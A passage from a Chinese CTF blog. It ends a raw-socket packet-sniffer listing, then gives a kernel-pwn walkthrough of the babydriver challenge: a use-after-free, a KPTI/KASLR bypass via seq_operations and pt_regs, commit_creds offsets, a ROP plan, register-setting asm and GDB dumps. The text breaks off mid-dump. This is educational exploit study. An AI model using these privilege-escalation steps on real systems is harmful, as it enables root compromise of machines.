<span class="number">0</span>, <span class="number">0</span>, <span class="number">0x0000001a</span> &#125;,</span><br><span class="line">		&#123; <span class="number">0x15</span>, <span class="number">8</span>, <span class="number">0</span>, <span class="number">0xc0a89d88</span> &#125;,</span><br><span class="line">		&#123; <span class="number">0x20</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x0000001e</span> &#125;,</span><br><span class="line">		&#123; <span class="number">0x15</span>, <span class="number">6</span>, <span class="number">7</span>, <span class="number">0xc0a89d88</span> &#125;,</span><br><span class="line">		&#123; <span class="number">0x15</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">0x00000806</span> &#125;,</span><br><span class="line">		&#123; <span class="number">0x15</span>, <span class="number">0</span>, <span class="number">5</span>, <span class="number">0x00008035</span> &#125;,</span><br><span class="line">		&#123; <span class="number">0x20</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x0000001c</span> &#125;,</span><br><span class="line">		&#123; <span class="number">0x15</span>, <span class="number">2</span>, <span class="number">0</span>, <span class="number">0xc0a89d88</span> &#125;,</span><br><span class="line">		&#123; <span class="number">0x20</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x00000026</span> &#125;,</span><br><span class="line">		&#123; <span class="number">0x15</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0xc0a89d88</span> &#125;,</span><br><span class="line">		&#123; <span class="number">0x6</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x00040000</span> &#125;,</span><br><span class="line">		&#123; <span class="number">0x6</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x00000000</span> &#125;,</span><br><span class="line">	&#125;;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">sock_fprog</span> <span class="title">Filter</span>;</span></span><br><span class="line"></span><br><span class="line">	Filter.len = <span class="number">14</span>;</span><br><span class="line">	Filter.filter = BPF_code;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> ((sock=socket(PF_PACKET, SOCK_RAW,htons(ETH_P_IP)))&lt;<span class="number">0</span>)&#123;</span><br><span class="line">		perror(<span class="string">&quot;socket&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(backupInit(&amp;file)&lt;<span class="number">0</span>)&#123;</span><br><span class="line">		perror(<span class="string">&quot;backup&quot;</span>);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(setsockopt(sock, SOL_SOCKET, SO_ATTACH_FILTER,&amp;Filter, <span class="keyword">sizeof</span>(Filter))&lt;<span class="number">0</span>)&#123;</span><br><span class="line">		perror(<span class="string">&quot;setsockopt&quot;</span>);</span><br><span class="line">		close(sock);</span><br><span class="line">		<span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	getNowtime(file);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">		n = recvfrom(sock,buffer,<span class="number">2048</span>,<span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>); </span><br><span class="line">		<span class="built_in">sprintf</span>(str,<span class="string">&quot;%d bytes read\n&quot;</span>,n);</span><br><span class="line">		printLog(str,file);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (n&lt;<span class="number">42</span>) &#123;</span><br><span class="line">			perror(<span class="string">&quot;recvfrom():&quot;</span>);</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;Incomplete packet (errno is %d)\n&quot;</span>,errno);</span><br><span class="line">			close(sock);</span><br><span class="line">			<span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		ethhead = buffer;</span><br><span class="line">		<span class="built_in">sprintf</span>(str,<span class="string">&quot;Source MAC address: &quot;</span></span><br><span class="line">				<span class="string">&quot;%02x:%02x:%02x:%02x:%02x:%02x\n&quot;</span>,</span><br><span class="line">				ethhead[<span class="number">0</span>],ethhead[<span class="number">1</span>],ethhead[<span class="number">2</span>],</span><br><span class="line">				ethhead[<span class="number">3</span>],ethhead[<span class="number">4</span>],ethhead[<span class="number">5</span>]);</span><br><span class="line">		printLog(str,file);</span><br><span class="line"></span><br><span class="line">		<span class="built_in">sprintf</span>(str,<span class="string">&quot;Destination MAC address: &quot;</span></span><br><span class="line">				<span class="string">&quot;%02x:%02x:%02x:%02x:%02x:%02x\n&quot;</span>,</span><br><span class="line">				ethhead[<span class="number">6</span>],ethhead[<span class="number">7</span>],ethhead[<span class="number">8</span>],</span><br><span class="line">				ethhead[<span class="number">9</span>],ethhead[<span class="number">10</span>],ethhead[<span class="number">11</span>]);</span><br><span class="line">		printLog(str,file);</span><br><span class="line"></span><br><span class="line">		iphead = (struct iphdr*)(buffer+<span class="number">14</span>);</span><br><span class="line">		tcphead = (struct tcphdr*)(buffer+<span class="number">14</span>+<span class="number">20</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span> (iphead-&gt;version &gt; <span class="number">0</span>) &#123; </span><br><span class="line">			<span class="built_in">sprintf</span>(str,<span class="string">&quot;Source host %d.%d.%d.%d\n&quot;</span>,</span><br><span class="line">					change(iphead-&gt;saddr,<span class="number">0</span>),change(iphead-&gt;saddr,<span class="number">1</span>),</span><br><span class="line">					change(iphead-&gt;saddr,<span class="number">2</span>),change(iphead-&gt;saddr,<span class="number">3</span>));</span><br><span class="line">			printLog(str,file);</span><br><span class="line"></span><br><span class="line">			<span class="built_in">sprintf</span>(str,<span class="string">&quot;Dest host %d.%d.%d.%d\n&quot;</span>,</span><br><span class="line">					change(iphead-&gt;daddr,<span class="number">0</span>),change(iphead-&gt;daddr,<span class="number">1</span>),</span><br><span class="line">					change(iphead-&gt;daddr,<span class="number">2</span>),change(iphead-&gt;daddr,<span class="number">3</span>));</span><br><span class="line">			printLog(str,file);</span><br><span class="line">			</span><br><span class="line">			<span class="built_in">sprintf</span>(str,<span class="string">&quot;Source ports:%d\nDest ports:%d\n&quot;</span>,</span><br><span class="line">					tcphead-&gt;source,tcphead-&gt;dest);</span><br><span class="line">			printLog(str,file);</span><br><span class="line">	</span><br><span class="line">			<span class="built_in">sprintf</span>(str,<span class="string">&quot;Layer-4 protocol %d\n&quot;</span>,iphead-&gt;protocol);</span><br><span class="line">			printLog(str,file);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="built_in">sprintf</span>(str,<span class="string">&quot;----------\n&quot;</span>);</span><br><span class="line">		printLog(str,file);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>参考：<a target="_blank" rel="noopener" href="http://www.nsfocus.net/index.php?act=magazine&amp;do=view&amp;mid=1797">NSFOCUS绿盟科技</a> </p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2023/02/19/seq_operations%20+%20pt_regs/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2023/02/19/seq_operations%20+%20pt_regs/" class="post-title-link" itemprop="url">seq_operations+pt_regs</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2023-02-19 19:26:43" itemprop="dateCreated datePublished" datetime="2023-02-19T19:26:43+08:00">2023-02-19</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2023-03-01 12:29:53" itemprop="dateModified" datetime="2023-03-01T12:29:53+08:00">2023-03-01</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Pwn-train/" itemprop="url" rel="index"><span itemprop="name">Pwn train</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>9.9k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>9 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>babydriver</strong></p>
<p>先进行解压：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mv rootfs.cpio rootfs.cpio.gz </span><br><span class="line">gunzip rootfs.cpio.gz</span><br></pre></td></tr></table></figure>
<ul>
<li>这个 <code>rootfs.cpio</code> 其实是个压缩包，不过它省略了后缀“.gz”，这里需要先改名后解压</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append &#x27;console=ttyS0 root=/dev/ram oops=panic panic=1&#x27; -enable-kvm -monitor /dev/null -m 64M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep</span><br></pre></td></tr></table></figure>
<ul>
<li>smep</li>
</ul>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line"> </span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line">chown root:root flag</span><br><span class="line">chmod 400 flag</span><br><span class="line">exec 0&lt;/dev/console</span><br><span class="line">exec 1&gt;/dev/console</span><br><span class="line">exec 2&gt;/dev/console</span><br><span class="line"></span><br><span class="line">insmod /babydriver.ko</span><br><span class="line">chmod 777 /dev/babydev</span><br><span class="line">echo -e &quot;\nBoot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds\n&quot;</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">babyopen</span><span class="params">(inode *inode, FILE *fp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _fentry__(inode, fp);</span><br><span class="line">  babydev_struct.device_buf = kmem_cache_alloc_trace(kmalloc_caches[<span class="number">6</span>], <span class="number">0x24000C0</span>LL, <span class="number">64LL</span>);</span><br><span class="line">  babydev_struct.device_buf_len = <span class="number">64LL</span>;</span><br><span class="line">  printk(<span class="string">&quot;device open\n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>伪条件竞争引发的 UAF 漏洞，即当我们同时打开两个设备，第二次会覆盖第一次分配的空间</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">babyioctl</span><span class="params">(FILE *fp, <span class="keyword">unsigned</span> <span class="keyword">int</span> command, __int64 arg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  _fentry__(fp, command);</span><br><span class="line">  <span class="keyword">if</span> ( command == <span class="number">0x10001</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    kfree(babydev_struct.device_buf);</span><br><span class="line">    babydev_struct.device_buf = _kmalloc(arg, <span class="number">0x24000C0</span>LL);<span class="comment">// void *kmalloc(size_t size, int flags)</span></span><br><span class="line">    babydev_struct.device_buf_len = arg;</span><br><span class="line">    printk(<span class="string">&quot;alloc done\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    printk(<span class="string">&quot;13defalut:arg is %ld\n&quot;</span>, arg);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>可以再释放后再申请（改写大小）</li>
</ul>
<p>babydriver 是我们入门内核的第一道题目，现在来看看它的两个变种</p>
<p><strong>变种一：添加 KPTI 和 kaslr</strong></p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line"></span><br><span class="line">qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append &#x27;console=ttyS0 root=/dev/ram oops=panic panic=1 pti=on kaslr&#x27; -enable-kvm -monitor /dev/null -m 64M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep</span><br></pre></td></tr></table></figure>
<ul>
<li>smep</li>
<li>kaslr</li>
<li>KPTI（在 <code>append</code> 中添加 <code>pti=on</code>）</li>
</ul>
<p>KPTI（Kernel Page Table Isolation）就是内核页表隔离（内核版本 4.15 以上），使内核与用户态进程使用两套独立的页表</p>
<ul>
<li>在 Linux 中，寄存器 CR3 用于存储当前的 PGD 地址（四级页表结构：<code>PGD-&gt;PUD-&gt;PMD-&gt;PTE</code>）</li>
<li>如果开启了 KPTI，则在内核态与用户态切换时会同时切换 CR3 </li>
<li>为了提高切换的速度，内核将内核空间的 PGD 与用户空间的 PGD 两张页全局目录表放在一段连续的内存中（两张表，一张一页4k，总计8k，内核空间的在低地址，用户空间的在高地址）</li>
<li>只需要将 CR3 的第 13 位取反便能完成页表切换的操作</li>
</ul>
<p>KPTI：会使 <code>ret2usr</code> 失效，在用户空间中构造 <code>fake tty_operations</code> 也会失效，在 ROP 中需要切换 CR3 的 gadget</p>
<p>KPTI pass：使用 <code>seq_operations + pt_regs</code></p>
<p>结构体 <code>seq_operations</code> 的条目如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">seq_operations</span> &#123;</span></span><br><span class="line">    <span class="keyword">void</span> * (*start) (struct seq_file *m, <span class="keyword">loff_t</span> *pos);</span><br><span class="line">    <span class="keyword">void</span> (*stop) (struct seq_file *m, <span class="keyword">void</span> *v);</span><br><span class="line">    <span class="keyword">void</span> * (*next) (struct seq_file *m, <span class="keyword">void</span> *v, <span class="keyword">loff_t</span> *pos);</span><br><span class="line">    <span class="keyword">int</span> (*show) (struct seq_file *m, <span class="keyword">void</span> *v);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>当我们打开一个 stat 文件时（如 <code>/proc/self/stat</code>）便会在内核空间中分配一个 <code>seq_operations</code> 结构体 </li>
<li>当我们 read 一个 stat 文件时，内核会调用其 <code>proc_ops</code> 的 <code>proc_read_iter</code> 指针，然后调用 <code>seq_operations-&gt;start</code> 函数指针</li>
</ul>
<p>结构体 <code>pt_regs</code> 的条目如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pt_regs</span> &#123;</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * C ABI says these regs are callee-preserved. They aren&#x27;t saved on kernel entry</span></span><br><span class="line"><span class="comment"> * unless syscall needs a complete, fully filled &quot;struct pt_regs&quot;.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r15;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r14;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r13;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r12;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rbp;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rbx;</span><br><span class="line"><span class="comment">/* These regs are callee-clobbered. Always saved on kernel entry. */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r11;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r10;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r9;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> r8;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rax;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rcx;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rdx;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rsi;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rdi;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * On syscall entry, this is syscall#. On CPU exception, this is error code.</span></span><br><span class="line"><span class="comment"> * On hw interrupt, it&#x27;s IRQ number:</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> orig_rax;</span><br><span class="line"><span class="comment">/* Return frame for iretq */</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rip;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> cs;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> eflags;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> rsp;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> ss;</span><br><span class="line"><span class="comment">/* top of stack page */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<ul>
<li>在系统调用当中有很多的寄存器其实是不一定能用上的，比如 r8 ~ r15</li>
<li>只需要寻找到一条形如 <code>add rsp, val; ret</code> 的 gadget 便能够完成 ROP</li>
</ul>
<p>于是泄露思路如下：</p>
<ul>
<li>先执行两次 <code>open(&quot;/dev/babydev&quot;, O_RDWR)</code></li>
<li>执行 <code>ioctl(fd[0], 0x10001, 0x20)</code>，修改内核结构体的大小为 0x20（使 <code>seq_operations</code> 可以被放入这里）</li>
<li>释放 <code>fd[0]</code>，并且执行 <code>open(&quot;/proc/self/stat&quot;, O_RDONLY)</code>（内核结构体被释放，又被申请回来存放 <code>seq_operations</code>）</li>
<li>此时 <code>fd[1]</code> 仍然指向内核结构体，于是用 <code>read(fd[1], leak_data, 0x10)</code> 泄露内核基地址</li>
</ul>
<p>使用如下命令来查找需要的偏移：（使用前先关闭 kaslr，并开启 root 权限）</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/ <span class="meta"># cat /proc/kallsyms | grep commit_creds</span></span><br><span class="line">ffffffff810a1420 T commit_creds</span><br><span class="line">/ <span class="meta"># cat /proc/kallsyms | grep init_cred</span></span><br><span class="line">ffffffff81e48c60 D init_cred</span><br></pre></td></tr></table></figure>
<p>接下来需要把 <code>seq_operations-&gt;start</code> 覆盖为一个 gadget（类似于 <code>add rsp, offset;...; ret;</code>）</p>
<p>在开启 KPTI 内核，提权返回到用户态（<code>iretq/sysret</code>）之前如果不设置CR3寄存器的值，就会导致进程找不到当前程序的正确页表，引发段错误</p>
<p>常规设置需要从上到下执行3个 gadget：（改写 CR3 的第13位）</p>
<ul>
<li><code>pop rdi; ret;</code>（RDI 写入 <code>0x6f0</code>）</li>
<li><code>mov cr4, rdi; ret;</code></li>
<li><code>swapgs; pop rbp; ret;</code></li>
</ul>
<p>使用 <code>pt_regs</code> 在内核态写 ROP 链，就没有那么多空间来放入 gadget，于是我们用 <code>swapgs_restore_regs_and_return_to_usermode</code> 函数一次搞定（低版本的内核没有这个函数）</p>
<ul>
<li>需要的栈布局如下：</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">swapgs_restore_regs_and_return_to_usermode + <span class="number">22</span></span><br><span class="line"><span class="number">0</span> <span class="comment">// padding</span></span><br><span class="line"><span class="number">0</span> <span class="comment">// padding</span></span><br><span class="line">user_shell_addr</span><br><span class="line">user_cs</span><br><span class="line">user_rflags</span><br><span class="line">user_sp</span><br><span class="line">user_ss</span><br></pre></td></tr></table></figure>
<ul>
<li>只要把 <code>swapgs_restore_regs_and_return_to_usermode + 22</code> 放在 R10 的位置就可以符合条件</li>
</ul>
<p>综合上面的内容，我们可以得到劫持控制流的思路：</p>
<ul>
<li>执行 <code>write(fd[1], &amp;magic_addr, 8)</code> 写入形如 <code>add rsp, 0x148; ...; ret;</code> 的 gadget</li>
<li>通过 <code>pt_regs</code> 构造 ROP 链（R10 写上 <code>swapgs_restore_regs_and_return_to_usermode + 22</code>）</li>
<li>在 gadget 打上断点，然后计算该 gadget 到 <code>pt_regs</code> 结构体的偏移，寻找准确的 gadget</li>
</ul>
<p>在实际的调试中，我发现 <code>pt_regs</code> 的内容没有那么规整（可能是 sys_read 破坏了 <code>pt_regs</code> 原本的结构），下面给一个调试案例：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">__asm__(</span><br><span class="line">    <span class="string">&quot;mov r15, 0x55555555;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r14, 0x44444444;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r13, 0x33333333;&quot;</span> </span><br><span class="line">    <span class="string">&quot;mov r12, 0x22222222;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rbp, 0xbbbb1111;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rbx, 0xbbbb2222;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r11, 0x11111111;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r10, 0x11110000;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r9,  0x99999999;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov r8,  0x88888888;&quot;</span></span><br><span class="line">    <span class="string">&quot;xor rax, rax;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rcx, 0x666666;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rdx, 8;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rsi, rsp;&quot;</span></span><br><span class="line">    <span class="string">&quot;mov rdi, seq_fd;&quot;</span></span><br><span class="line">    <span class="string">&quot;syscall&quot;</span></span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>GDB 部分内存如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0xffff8800027cbdd8</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│ rsp <span class="number">0xffff8800027cbdd8</span> —▸ <span class="number">0xffffffff8122fab8</span> ◂— mov    r15, rax</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│     <span class="number">0xffff8800027cbde0</span> —▸ <span class="number">0xffffffff810ee6a9</span> ◂— <span class="keyword">xor</span>    edx, edx</span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│     <span class="number">0xffff8800027cbde8</span> —▸ <span class="number">0x7fff99311170</span> ◂— <span class="number">0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│     <span class="number">0xffff8800027cbdf0</span> —▸ <span class="number">0xffff88000276c1c0</span> ◂— <span class="number">0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│     <span class="number">0xffff8800027cbdf8</span> ◂— <span class="number">8</span></span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│ rsi <span class="number">0xffff8800027cbe00</span> ◂— <span class="number">0</span></span><br><span class="line">    ......</span><br><span class="line"><span class="number">0</span>c:<span class="number">0060</span>│     <span class="number">0xffff8800027cbe38</span> ◂— push   rbp <span class="comment">/* 0x55555555; &#x27;UUUU&#x27; */</span></span><br><span class="line"><span class="number">0</span>d:<span class="number">0068</span>│ rbp <span class="number">0xffff8800027cbe40</span> —▸ <span class="number">0xffff8800027cbec8</span> —▸ <span class="number">0xffff8800027cbf00</span> —▸ <span class="number">0xffff8800027cbf48</span> ◂— adc    dword ptr [rcx], edx <span class="comment">/* 0xbbbb1111 */</span></span><br><span class="line"><span class="number">0</span>e:<span class="number">0070</span>│     <span class="number">0xffff8800027cbe48</span> —▸ <span class="number">0xffffffff8120ad17</span> ◂— mov    rdi, qword ptr [rbp - <span class="number">0x18</span>]</span><br><span class="line"><span class="number">0f</span>:<span class="number">0078</span>│     <span class="number">0xffff8800027cbe50</span> ◂— add    byte ptr [rax], al <span class="comment">/* 0x20000 */</span></span><br><span class="line">    ......</span><br><span class="line"><span class="number">28</span>:<span class="number">0140</span>│ r12 <span class="number">0xffff8800027cbf18</span> ◂— <span class="number">0</span></span><br><span class="line"><span class="number">29</span>:<span class="number">0148</span>│     <span class="number">0xffff8800027cbf20</span> ◂— adc    byte ptr [rdi], cl <span class="comment">/* 0xfdb69a886c1b0f10 */</span></span><br><span class="line"><span class="number">2</span>a:<span class="number">0150</span>│     <span class="number">0xffff8800027cbf28</span> ◂— <span class="keyword">and</span>    ah, byte ptr [rdx] <span class="comment">/* 0xbbbb2222 */</span></span><br><span class="line"><span class="number">2b</span>:<span class="number">0158</span>│     <span class="number">0xffff8800027cbf30</span> ◂— <span class="keyword">and</span>    ah, byte ptr [rdx] <span class="comment">/* 0x22222222; &#x27;&quot;&quot;&quot;&quot;&#x27; */</span></span><br><span class="line"><span class="number">2</span>c:<span class="number">0160</span>│     <span class="number">0xffff8800027cbf38</span> ◂— <span class="keyword">xor</span>    esi, dword ptr [rbx] <span class="comment">/* 0x33333333; &#x27;3333&#x27; */</span></span><br><span class="line"><span class="number">2</span>d:<span class="number">0168</span>│     <span class="number">0xffff8800027cbf40</span> ◂— add    byte ptr [rax], r8b <span 